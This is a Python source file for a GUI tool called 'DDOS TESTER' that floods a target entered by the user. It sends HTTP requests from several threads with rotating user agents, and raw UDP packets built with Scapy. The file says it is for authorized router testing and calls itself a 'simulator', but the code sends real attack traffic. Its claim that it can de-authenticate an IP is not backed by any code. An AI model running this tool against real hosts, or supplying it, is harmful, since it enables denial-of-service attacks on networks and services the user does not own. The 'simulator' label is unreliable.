#!/usr/bin/env python3
"""
Tool: Dos_tester.py
Author: Allen (@elliotallderson34-ops)
Purpose:  To test router loading capacity or to de auth a specific IP (authorized testing only)
License: GPL-3.0
Warning: You are responsible for your actions. Use ethically.
"""

import tkinter as tk
from tkinter import messagebox
from tkinter.scrolledtext import ScrolledText
import socket
import threading
import random
import time
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Warning: Scapy not available. UDP flood will not work.")

# --- Tool Constants ---
TIMEOUT = 2
MAX_THREADS = 6
DELAY_BETWEEN_REQUESTS = 1
running = False
HEADERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
]

http_methods = ["GET", "POST", "PUT", "DELETE"]
http_versions = ["HTTP/1.0", "HTTP/1.1", "HTTP/2.0"]

def random_Agent():
    return {"User-Agent": random.choice(HEADERS)}

# --- Tool Core Logic ---
def send_requests(target_url, ip, thread_id, append_output):
    """Send random HTTP requests to a target"""
    global running
    while running:
        try:
            method = random.choice(http_methods)
            version = random.choice(http_versions)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            s.connect((ip, 80))
            request = f"{method} / {version}\r\nHost: {target_url}\r\n"
            request += f"User-Agent: {random.choice(HEADERS)}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
            request += "Accept-Language: en-US,en;q=0.9\r\n"
            request += "Accept-Encoding: gzip, deflate\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            s.send(request.encode('utf-8'))
            s.close()
            append_output(f"[HTTP-{thread_id}] Sent {method} request to {target_url}")
            time.sleep(DELAY_BETWEEN_REQUESTS)
        except Exception as e:
            if running:
                append_output(f"[HTTP-{thread_id}] Error: {e}")
            break
    return

def udp_flood(target_ip, target_port, thread_id, append_output):
    """Send UDP packets"""
    global running
    if not SCAPY_AVAILABLE:
        append_output(f"[UDP-{thread_id}] Scapy not available. Skipping UDP flood.")
        return
        
    while running:
        try:
            packet = scapy.IP(dst=target_ip)/scapy.UDP(dport=target_port)/scapy.Raw(load="X"*2000)
            scapy.send(packet, verbose=False)
            append_output(f"[UDP-{thread_id}] Sent UDP packet to {target_ip}:{target_port}")
            time.sleep(DELAY_BETWEEN_REQUESTS)
        except Exception as e:
            if running:
                append_output(f"[UDP-{thread_id}] Error: {e}")
            break
    return

# --- GUI Setup ---
def launch_gui():
    global running

    root = tk.Tk()
    root.title("DDOS TESTER (SIMULATOR)")
    root.geometry("650x500")
    root.config(bg="#1e1e1e")
    root.resizable(False, False)

    # Title
    title_label = tk.Label(
        root, text="⚡ DDOS TESTER ⚡",
        font=("Segoe UI", 20, "bold"),
        fg="white", bg="#1e1e1e"
    )
    title_label.pack(pady=10)

    # Output Box
    output_box = ScrolledText(root, width=75, height=15, bg="#262626", fg="#00FF7F",
                              insertbackground="white", font=("Consolas", 10))
    output_box.pack(pady=10)

    def append_output(text: str):
        output_box.insert(tk.END, text + "\n")
        output_box.see(tk.END)

    # Input Fields
    entry_frame = tk.Frame(root, bg="#1e1e1e")
    entry_frame.pack(pady=5)

    tk.Label(entry_frame, text="🎯 Target (URL or IP):", bg="#1e1e1e", fg="white").grid(row=0, column=0, sticky="w")
    target_entry = tk.Entry(entry_frame, width=40, bg="#333", fg="white", relief="flat")
    target_entry.grid(row=0, column=1, padx=10)

    tk.Label(entry_frame, text="📡 Port:", bg="#1e1e1e", fg="white").grid(row=1, column=0, sticky="w", pady=5)
    port_entry = tk.Entry(entry_frame, width=10, bg="#333", fg="white", relief="flat")
    port_entry.grid(row=1, column=1, sticky="w")
    port_entry.insert(0, "80")

    status_label = tk.Label(root, text="Status: Idle", bg="#1e1e1e", fg="gray")
    status_label.pack(pady=5)

    # Worker starter (non-blocking)
    def start_attack():
        global running
        if running:
            messagebox.showinfo("Info", "Already running.")
            return

        target = target_entry.get().strip()
        port_text = port_entry.get().strip()

        if not target:
            messagebox.showerror("Error", "Please enter a valid target!")
            return

        try:
            port = int(port_text)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Invalid port number!")
            return

        # Resolve IP for display (safe; DNS lookup)
        ip = None
        try:
            # Check if target is already an IP address
            socket.inet_aton(target)
            ip = target  # It's a valid IP
        except socket.error:
            # It's a hostname, try to resolve it
            try:
                ip = socket.gethostbyname(target)
            except Exception as e:
                messagebox.showerror("Resolve error", f"Could not resolve target: {e}")
                return

        # prepare UI
        output_box.delete("1.0", tk.END)
        append_output(f"[SYSTEM] Starting simulator on {target}:{port}")
        append_output(f"[SYSTEM] Resolved IP: {ip}")
        status_label.config(text="Status: Running...", fg="lime")

        # set running flag and start simulator threads, then return immediately
        running = True

        def start_threads():
            # Launch MAX_THREADS pairs of simulators per overall run
            for i in range(1, MAX_THREADS + 1):
                if not running: 
                    break
                http_thread = threading.Thread(
                    target=send_requests, 
                    args=(target, ip, i, append_output), 
                    daemon=True
                )
                udp_thread = threading.Thread(
                    target=udp_flood, 
                    args=(ip, port, i, append_output), 
                    daemon=True
                )
                http_thread.start()
                udp_thread.start()
                append_output(f"[SYSTEM] Started simulator threads HTTP-{i} and UDP-{i}")
                time.sleep(0.05)  # brief stagger
            append_output("[SYSTEM] Simulator threads launched.")

            # optional: wait for threads to end and then update status (not required)
            # Here we simply set status to Active; Stop button will set running=False
            status_label.config(text="Status: Active", fg="green")

        threading.Thread(target=start_threads, daemon=True).start()

    # Stop signal for worker threads
    def stop_attack():
        global running
        if not running:
            messagebox.showinfo("Info", "Not running.")
            return
        running = False
        status_label.config(text="Status: Stopping...", fg="orange")
        append_output("[SYSTEM] Stop requested. Threads will exit shortly.")

        # finalize stop in short time (threads will notice flag)
        def finalize():
            time.sleep(0.5)
            status_label.config(text="Status: Stopped", fg="red")
            append_output("[SYSTEM] Stopped.")
        threading.Thread(target=finalize, daemon=True).start()

    # Buttons
    btn_frame = tk.Frame(root, bg="#1e1e1e")
    btn_frame.pack(pady=15)

    start_btn = tk.Button(btn_frame, text="▶ START", command=start_attack,
                          bg="#27ae60", fg="white", width=12, font=("Segoe UI", 10, "bold"))
    start_btn.pack(side="left", padx=10)

    stop_btn = tk.Button(btn_frame, text="⏸ STOP", command=stop_attack,
                         bg="#e74c3c", fg="white", width=12, font=("Segoe UI", 10, "bold"))
    stop_btn.pack(side="left", padx=10)

    exit_btn = tk.Button(btn_frame, text="❌ EXIT", command=root.destroy,
                         bg="#2c3e50", fg="white", width=12, font=("Segoe UI", 10, "bold"))
    exit_btn.pack(side="left", padx=10)

    root.mainloop()

if __name__ == "__main__":
    launch_gui()
